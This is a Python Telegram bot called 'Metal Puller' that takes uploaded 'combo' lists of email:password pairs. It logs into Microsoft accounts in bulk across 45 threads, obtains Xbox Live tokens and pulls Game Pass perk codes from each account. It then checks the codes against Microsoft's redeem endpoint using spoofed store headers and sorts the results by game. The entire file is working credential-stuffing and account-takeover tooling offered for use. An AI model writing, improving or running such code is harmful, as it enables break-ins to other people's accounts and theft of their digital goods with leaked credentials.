#!/usr/bin/env python3
"""
METAL PULLER - TELEGRAM BOT EDITION (TXT FILE SUPPORT INCLUDED)
Designed for high performance execution on Railway via environmental variables.
Features: Pulling, Validation, Sorting, Live UI updates every 5 seconds, 
Thread control (40-50 workers), .txt document handling, and asynchronous execution.
Language: English
"""

import os
import sys
import re
import json
import time
import random
import string
import uuid
import queue
import threading
import asyncio
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

# Try to import external dependencies safely
try:
    import requests
except ImportError:
    print("Critical Error: 'requests' library is not installed. Run 'pip install requests'")
    sys.exit(1)

try:
    from aiogram import Bot, Dispatcher, F, types
    from aiogram.filters import Command
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
    from aiogram.fsm.context import FSMContext
    from aiogram.fsm.state import State, StatesGroup
    from aiogram.fsm.storage.memory import MemoryStorage
except ImportError:
    print("Critical Error: 'aiogram' (v3.x) library is not installed. Run 'pip install aiogram'")
    sys.exit(1)

# ============================================================================
# RAILWAY CONFIGURATION & ENVIRONMENT VARIABLES
# ============================================================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
OWNER_ID = os.getenv("OWNER_ID", "YOUR_TELEGRAM_ID_HERE")

if OWNER_ID.isdigit():
    OWNER_ID = int(OWNER_ID)
else:
    print("Warning: OWNER_ID env variable is not a valid integer. Check your Railway configuration.")

# GLOBAL DATA STRUCTURES & LOCKS
ACTIVE_TASKS = {}
print_lock = threading.Lock()
results_lock = threading.Lock()

MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

class BotStates(StatesGroup):
    waiting_for_accounts_check_validation = State()
    waiting_for_accounts_check_only = State()
    waiting_for_codes_to_sort = State()

# ============================================================================
# INTERIOR CORE ARCHITECTURE - HELPER ENGINE
# ============================================================================
def generate_reference_id():
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1:
            result_chars.append(n[(e - 1) // 8])
        else:
            result_chars.append(o[e])
    return "".join(result_chars)

def extract_game_type(game_name):
    game_name = game_name.upper()
    if 'SUNSET SARSAPARILLA' in game_name: return '🥤 Sunset Sarsaparilla Bundle'
    elif 'RAINBOW SIX SIEGE' in game_name: return '🔫 Rainbow Six Siege'
    elif 'SKATE' in game_name: return '🛹 Skate Supercharge Pack'
    elif 'MADDEN NFL' in game_name: return '🏈 Madden NFL Supercharge Pack'
    elif 'WARFRAME' in game_name: return '⚔️ Warframe Bundle'
    elif 'THRONE AND LIBERTY' in game_name: return '👑 Throne and Liberty'
    elif 'DRIFT BUNDLE' in game_name: return '🚗 Drift Bundle'
    elif 'WINTER' in game_name and 'XBOX BENEFITS' in game_name: return '❄️ Winter Xbox Benefits Pack'
    elif 'JANG SAO' in game_name: return '🏆 Jang Sao Champions Bundle'
    elif 'PSO2:NGS' in game_name or 'PHANTASY STAR' in game_name: return '⭐ PSO2:NGS Monthly Bonus'
    elif 'XBOX GAME PASS' in game_name: return '🎮 Xbox Game Pass'
    elif 'BUNDLE' in game_name: return '🎁 Game Bundle'
    elif 'PACK' in game_name: return '📦 Game Pack'
    else: return '🎮 Other Games'

def format_game_codes_output(game_groups):
    lines = []
    sorted_groups = sorted(game_groups.items(), key=lambda x: (-len(x[1]), x[0]))
    lines.append("🎮 METAL PULLER - SORTED GAME CODES 🎮")
    lines.append("=" * 60)
    lines.append("")
    total_codes = 0
    code_counts_global = 0
    for game_type, codes_list in sorted_groups:
        count = len(codes_list)
        total_codes += count
        lines.append(f"📋 {game_type} ({count} codes)")
        lines.append("-" * 50)
        codes_list.sort(key=lambda x: x[0])
        code_counts = {}
        for code, game_name in codes_list:
            if code not in code_counts: code_counts[code] = []
            code_counts[code].append(game_name)
        code_counts_global += len(code_counts)
        for code, game_names in sorted(code_counts.items()):
            if len(game_names) == 1:
                lines.append(f"{code} | {game_names[0]}")
            else:
                lines.append(f"{code} (x{len(game_names)}) | {game_names[0]}")
                for game_name in game_names[1:]:
                    lines.append(f"{' ' * (len(code) + 3)}| {game_name}")
        lines.append("")
    lines.append("📊 SUMMARY REPORT")
    lines.append("=" * 60)
    lines.append(f"Total Unique Codes Discovered: {code_counts_global}")
    lines.append(f"Total Code Entries Logged: {total_codes}")
    lines.append(f"Game Categories Processed: {len(game_groups)}")
    lines.append(f"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC")
    return "\n".join(lines) + "\n"

def parse_accounts_data(text_data: str):
    accounts = []
    lines = text_data.split('\n')
    for line in lines:
        line = line.strip()
        if line and ':' in line and not line.startswith('#'):
            parts = line.split(':', 1)
            accounts.append((parts[0].strip(), parts[1].strip()))
    return accounts

async def download_telegram_txt(message: types.Message, bot_instance: Bot) -> str:
    """Helper tool to download and decode .txt documents directly into memory string."""
    if message.document and (message.document.file_name.endswith('.txt') or message.document.mime_type == 'text/plain'):
        file_info = await bot_instance.get_file(message.document.file_id)
        file_buffer = await bot_instance.download_file(file_info.file_path)
        content = file_buffer.read().decode('utf-8', errors='ignore')
        return content
    return ""

# ============================================================================
# FETCHER & VALIDATOR BACKEND ENGINE (UNCHANGED CORE DYNAMICS)
# ============================================================================
def fetch_oauth_tokens(session):
    try:
        response = session.get(MICROSOFT_OAUTH_URL, timeout=5)
        text = response.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if not match: return (None, None)
        ppft = match.group(1)
        match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
        if not match: return (None, None)
        return (match.group(1), ppft)
    except: return (None, None)

def fetch_login(session, email, password, url_post, ppft):
    try:
        resp = session.post(url_post, data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft},
                           headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=5)
        if '#' in resp.url:
            token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
            if token != 'None': return token
        return None
    except: return None

def get_xbox_tokens(session, rps_token):
    try:
        resp = session.post('https://user.auth.xboxlive.com/user/authenticate',
            json={'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}},
            headers={'Content-Type': 'application/json'}, timeout=5)
        if resp.status_code != 200: return (None, None)
        user_token = resp.json().get('Token')
        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
            json={'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}},
            headers={'Content-Type': 'application/json'}, timeout=5)
        if resp.status_code != 200: return (None, None)
        data = resp.json()
        return (data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), data.get('Token'))
    except: return (None, None)

def fetch_codes_from_xbox(session, uhs, xsts_token):
    try:
        auth = f'XBL3.0 x={uhs};{xsts_token}'
        resp = session.get('https://profile.gamepass.com/v2/offers',
            headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=5)
        if resp.status_code != 200: return []
        codes = []
        for offer in resp.json().get('offers', []):
            resource = offer.get('resource')
            if resource: codes.append(resource)
        return codes
    except: return []

def fetch_account_worker_standalone(email, password):
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    try:
        url_post, ppft = fetch_oauth_tokens(session)
        if not url_post: return False, [], "Auth failed"
        rps = fetch_login(session, email, password, url_post, ppft)
        if not rps: return False, [], "Login failed"
        uhs, xsts = get_xbox_tokens(session, rps)
        if not uhs: return False, [], "Xbox tokens failed"
        codes = fetch_codes_from_xbox(session, uhs, xsts)
        return True, codes, f"Success ({len(codes)} codes)"
    except Exception as e: return False, [], str(e)
    finally: session.close()

def login_microsoft_account(email, password):
    session = requests.Session()
    try:    
        login_response = session.post(
            f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=1761964181&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none",
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
            timeout=10
        )
        reurl_match = re.search(r'replace\(\"([^\"]+)\"', login_response.text.replace('\\', ''))
        if not reurl_match: return None
        reresp = session.get(reurl_match.group(1), timeout=10).text
        actch = re.search(r'<form.*?action="(.*?)".*?>', reresp)
        if not actch: return None
        input_matches = re.findall(r'<input.*?name="(.*?)".*?value="(.*?)".*?>', reresp)
        fta = {name: value for name, value in input_matches}
        session.post(actch.group(1), data=fta, allow_redirects=True, timeout=10)
        return session
    except: return None

def get_auth_token(session, force_refresh=False):
    try:
        if not force_refresh and hasattr(session, 'wlid_token'): return session.wlid_token
        token_response = session.get('https://account.microsoft.com/auth/acquire-onbehalf-of-token', params={'scopes': 'MSComServiceMBISSL'}, timeout=5)
        token = token_response.json()[0]['token']
        session.wlid_token = token
        return token
    except: return None

def get_store_cart_state(session, force_refresh=False):
    try:
        if force_refresh and hasattr(session, 'store_state'): delattr(session, 'store_state')
        if not force_refresh and hasattr(session, 'store_state'): return session.store_state
        token = get_auth_token(session, force_refresh)
        response = session.post('https://www.microsoft.com/store/purchase/buynowui/redeemnow', params={'market': 'US', 'locale': 'en-GB'}, data={'data': '{"usePurchaseSdk":true}', 'market': 'US', 'locale': 'en-GB', 'msaTicket': token, 'pageFormat': 'full', 'clientType': 'AccountMicrosoftCom'}, timeout=10)
        match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', response.text, re.DOTALL)
        store_state = json.loads(match.group(1))
        extracted = {'ms_cv': store_state['appContext']['cv'], 'tracking_id': store_state['appContext']['trackingId'], 'vector_id': store_state['appContext']['vectorId'], 'correlation_id': store_state['appContext']['correlationId'], 'alternative_muid': store_state['appContext']['alternativeMuid']}
        session.store_state = extracted
        return extracted
    except: return None

def validate_code_primary(session, code, force_refresh_ids=False):
    try:
        if not code or len(code) < 5 or any(char in ['A', 'E', 'I', 'O', 'U', 'L', 'S', '0', '1', '5'] for char in code):
            return {"status": "INVALID", "message": "Invalid format"}
        state = get_store_cart_state(session, force_refresh_ids)
        token = get_auth_token(session, force_refresh_ids)
        headers = {"x-ms-tracking-id": state['tracking_id'], "authorization": f"WLID1.0=t={token}", "ms-cv": state['ms_cv'], "x-ms-reference-id": generate_reference_id(), "x-ms-vector-id": state['vector_id'], "x-ms-correlation-id": state['correlation_id'], "content-type": "application/json"}
        payload = {"market": "US", "language": "en-US", "tokenIdentifierValue": code, "buyNowScenario": "redeem", "clientContext": {"client": "AccountMicrosoftCom", "deviceFamily": "Web"}}
        res = session.post('https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken', headers=headers, json=payload, timeout=5)
        if res.status_code == 429: return {"status": "RATE_LIMITED", "message": "Rate limited"}
        data = res.json()
        if "tokenType" in data and data["tokenType"] == "CSV": return {"status": "BALANCE_CODE", "message": f"{code} | {data.get('value')} {data.get('currency')}"}
        if "events" in data and "cart" in data["events"] and data["events"]["cart"]:
            reason = data["events"]["cart"][0].get("data", {}).get("reason", "")
            if "TooManyRequests" in reason: return {"status": "RATE_LIMITED", "message": "Rate limit"}
            if reason == "RedeemTokenAlreadyRedeemed": return {"status": "REDEEMED", "message": f"{code} | REDEEMED"}
            if reason in ["RedeemTokenExpired", "RedeemTokenNoMatchingOrEligibleProductsFound"]: return {"status": "EXPIRED", "message": f"{code} | EXPIRED"}
            if reason == "RedeemTokenGeoFencingError": return {"status": "REGION_LOCKED", "message": f"{code} | REGION_LOCKED"}
        if "products" in data and len(data["products"]) > 0:
            title = data["products"][0].get("title", "Unknown Title")
            return {"status": "VALID", "message": f"{code} | {title}"}
        return {"status": "UNKNOWN", "message": f"{code} | UNKNOWN"}
    except: return {"status": "ERROR", "message": f"{code} | Request error"}

# ============================================================================
# PIPELINES EXECUTION MATRIX
# ============================================================================
def execute_check_and_validation_pipeline(task_id, accounts):
    task = ACTIVE_TASKS[task_id]
    task["status_msg"] = "Phase 1/2: Pulling codes from MS Accounts..."
    pulled_pool = []
    with ThreadPoolExecutor(max_workers=45) as exec:
        fut = {exec.submit(fetch_account_worker_standalone, a[0], a[1]): a for a in accounts}
        for f in as_completed(fut):
            if task["stop_requested"]: break
            succ, c, m = f.result()
            task["total_pulled_accounts"] += 1
            if succ:
                pulled_pool.extend(c)
                task["total_pulled_codes"] += len(c)
    if task["stop_requested"]: return
    uniq = list(set(pulled_pool))
    task["total_codes_to_check"] = len(uniq)
    task["status_msg"] = f"Phase 2/2: Validating {len(uniq)} codes..."
    active_s = []
    for a in accounts[:5]:
        s = login_microsoft_account(a[0], a[1])
        if s: active_s.append(s)
        if len(active_s) >= 2: break
    if not active_s:
        task["status_msg"] = "Aborted: Authentication failed."
        task["is_running"] = False
        return
    q = queue.Queue()
    for c in uniq: q.put(c)
    def worker(sess):
        while not q.empty() and not task["stop_requested"]:
            c_item = q.get()
            res = validate_code_primary(sess, c_item)
            st = res.get("status")
            msg = res.get("message")
            with results_lock:
                task["total_checked_codes"] += 1
                if st in ['VALID', 'BALANCE_CODE']: task["valid_list"].append(msg)
                elif st == 'REGION_LOCKED': task["region_locked_list"].append(msg)
                elif st in ['REDEEMED', 'EXPIRED', 'INVALID']: task["invalid_list"].append(msg)
                else: task["unknown_list"].append(msg)
            q.task_done()
    threads = [threading.Thread(target=worker, args=(s,)) for s in active_s]
    for t in threads: t.start()
    for t in threads: t.join()
    task["is_running"] = False

def execute_check_only_pipeline(task_id, accounts):
    task = ACTIVE_TASKS[task_id]
    with ThreadPoolExecutor(max_workers=45) as exec:
        fut = {exec.submit(fetch_account_worker_standalone, a[0], a[1]): a for a in accounts}
        for f in as_completed(fut):
            if task["stop_requested"]: break
            succ, c, m = f.result()
            task["total_pulled_accounts"] += 1
            if succ:
                task["total_pulled_codes"] += len(c)
                with results_lock:
                    for code in c: task["valid_list"].append(code)
    task["is_running"] = False

# ============================================================================
# TELEGRAM SERVICE CONTROLLER
# ============================================================================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

def make_dashboard_markup(task_id, finished=False):
    kb = [[InlineKeyboardButton(text="🛑 Stop Pipeline", callback_data=f"stop_{task_id}")]] if not finished else [[InlineKeyboardButton(text="🔄 Menu", callback_data="back_main")]]
    return InlineKeyboardMarkup(inline_keyboard=kb)

async def live_monitoring_loop(msg_obj: types.Message, task_id: str, mode: str):
    while True:
        await asyncio.sleep(5)
        if task_id not in ACTIVE_TASKS: break
        t = ACTIVE_TASKS[task_id]
        elapsed = int(time.time() - t["start_time"])
        ui = (
            f"⚡ <b>METAL PULLER LIVE DASHBOARD</b> ⚡\n"
            f"==================================\n"
            f"⚙️ <b>Mode:</b> {mode.upper()}\n"
            f"ℹ️ <b>Status:</b> {t['status_msg']}\n"
            f"⏱️ <b>Elapsed:</b> {elapsed}s\n"
            f"==================================\n"
            f"👥 <b>Accounts Configured:</b> {t['total_pulled_accounts']}\n"
            f"🎁 <b>Codes Extracted:</b> {t['total_pulled_codes']}\n"
        )
        if mode == "check_validation":
            ui += f"📥 <b>Validated:</b> {t['total_checked_codes']}/{t['total_codes_to_check']}\n🟢 <b>Valid:</b> {len(t['valid_list'])} | 🔴 <b>Bad:</b> {len(t['invalid_list'])}"
        try: await msg_obj.edit_text(ui, reply_markup=make_dashboard_markup(task_id), parse_mode="HTML")
        except: pass
        if not t["is_running"]: break
    await transmit_outputs(msg_obj, task_id, mode)

async def transmit_outputs(msg_obj: types.Message, task_id: str, mode: str):
    t = ACTIVE_TASKS[task_id]
    def b_file(lst): return BufferedInputFile("\n".join(lst).encode('utf-8'), filename="output.txt")
    if mode == "check_validation":
        if t["valid_list"]: await msg_obj.reply_document(document=b_file(t["valid_list"]), caption="🟢 valid_codes.txt")
        if t["region_locked_list"]: await msg_obj.reply_document(document=b_file(t["region_locked_list"]), caption="🌍 region_locked.txt")
        if t["invalid_list"]: await msg_obj.reply_document(document=b_file(t["invalid_list"]), caption="❌ bad_codes.txt")
    elif mode == "check_only" and t["valid_list"]:
        await msg_obj.reply_document(document=b_file(t["valid_list"]), caption="📥 pulled_codes.txt")
    if task_id in ACTIVE_TASKS: del ACTIVE_TASKS[task_id]

# ============================================================================
# COMMANDS & INGESTION MECHANICS
# ============================================================================
def build_welcome_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⚡ Check And Validation", callback_data="menu_check_val")],
        [InlineKeyboardButton(text="📥 Check (Pull Only)", callback_data="menu_check_only")],
        [InlineKeyboardButton(text="🔮 Sort Categories", callback_data="menu_sort")]
    ])

@dp.message(Command("start"))
async def start_cmd(message: types.Message, state: FSMContext):
    if OWNER_ID and message.from_user.id != OWNER_ID: return
    await state.clear()
    await message.reply("🤖 <b>Metal Puller Control Matrix Active.</b>", reply_markup=build_welcome_menu(), parse_mode="HTML")

@dp.callback_query(F.data == "back_main")
async def back_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("🤖 <b>Select operational parameters:</b>", reply_markup=build_welcome_menu(), parse_mode="HTML")

@dp.callback_query(F.data == "menu_check_val")
async def check_val_cb(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("📝 <b>Validation Pipeline Mode</b>\n\nDrop your <code>.txt</code> file here or send raw combo data directly as text.", parse_mode="HTML")
    await state.set_state(BotStates.waiting_for_accounts_check_validation)

@dp.callback_query(F.data == "menu_check_only")
async def check_only_cb(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("📥 <b>Pull Only Pipeline Mode</b>\n\nDrop your <code>.txt</code> file here or send raw combo data directly as text.", parse_mode="HTML")
    await state.set_state(BotStates.waiting_for_accounts_check_only)

@dp.callback_query(F.data == "menu_sort")
async def sort_cb(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🔮 <b>Lexical Sorting Engine Mode</b>\n\nDrop your <code>.txt</code> log file containing game codes to structure them.", parse_mode="HTML")
    await state.set_state(BotStates.waiting_for_codes_to_sort)

# ============================================================================
# INTEGRATED COMBINED INPUT HANDLERS (TEXT + TXT FILE CHANNELS)
# ============================================================================
@dp.message(BotStates.waiting_for_accounts_check_validation, F.content_type.in_({'text', 'document'}))
async def handle_check_val_input(message: types.Message, state: FSMContext):
    raw_data = await download_telegram_txt(message, bot) if message.document else message.text
    accs = parse_accounts_data(raw_data) if raw_data else []
    if not accs:
        await message.reply("❌ Empty or invalid data parsed. Upload a clean .txt layout.")
        return
    await state.clear()
    tid = str(uuid.uuid4())[:8]
    ACTIVE_TASKS[tid] = {"start_time": time.time(), "is_running": True, "stop_requested": False, "status_msg": "Initializing framework...", "total_pulled_accounts": 0, "total_pulled_codes": 0, "total_codes_to_check": 0, "total_checked_codes": 0, "valid_list": [], "invalid_list": [], "region_locked_list": [], "unknown_list": []}
    m = await message.reply("⚡ <b>Spawning validation infrastructure...</b>", parse_mode="HTML")
    threading.Thread(target=execute_check_and_validation_pipeline, args=(tid, accs)).start()
    asyncio.create_task(live_monitoring_loop(m, tid, "check_validation"))

@dp.message(BotStates.waiting_for_accounts_check_only, F.content_type.in_({'text', 'document'}))
async def handle_check_only_input(message: types.Message, state: FSMContext):
    raw_data = await download_telegram_txt(message, bot) if message.document else message.text
    accs = parse_accounts_data(raw_data) if raw_data else []
    if not accs:
        await message.reply("❌ Zero credentials extracted from source file.")
        return
    await state.clear()
    tid = str(uuid.uuid4())[:8]
    ACTIVE_TASKS[tid] = {"start_time": time.time(), "is_running": True, "stop_requested": False, "status_msg": "Pulling execution paths...", "total_pulled_accounts": 0, "total_pulled_codes": 0, "total_checked_codes": 0, "valid_list": []}
    m = await message.reply("📥 <b>Spawning data collection routines...</b>", parse_mode="HTML")
    threading.Thread(target=execute_check_only_pipeline, args=(tid, accs)).start()
    asyncio.create_task(live_monitoring_loop(m, tid, "check_only"))

@dp.message(BotStates.waiting_for_codes_to_sort, F.content_type.in_({'text', 'document'}))
async def handle_sorting_input(message: types.Message, state: FSMContext):
    await state.clear()
    raw_data = await download_telegram_txt(message, bot) if message.document else message.text
    if not raw_data:
        await message.reply("❌ No textual or file-based structural array found.")
        return
    lines = raw_data.split('\n')
    game_groups = {}
    for line in lines:
        line = line.strip()
        if not line: continue
        if '|' in line:
            code, gname = line.split('|', 1)
            gtype = extract_game_type(gname.strip())
            if gtype not in game_groups: game_groups[gtype] = []
            game_groups[gtype].append((code.strip(), gname.strip()))
        else:
            if 'Other' not in game_groups: game_groups['Other'] = []
            game_groups['Other'].append((line, 'Unknown Bundle'))
    formatted = format_game_codes_output(game_groups)
    await message.reply_document(document=BufferedInputFile(formatted.encode('utf-8'), filename="sorted_manifest.txt"), caption="🔮 Sorted log output generated successfully.")

# ============================================================================
# START LOOP EXECUTION
# ============================================================================
async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
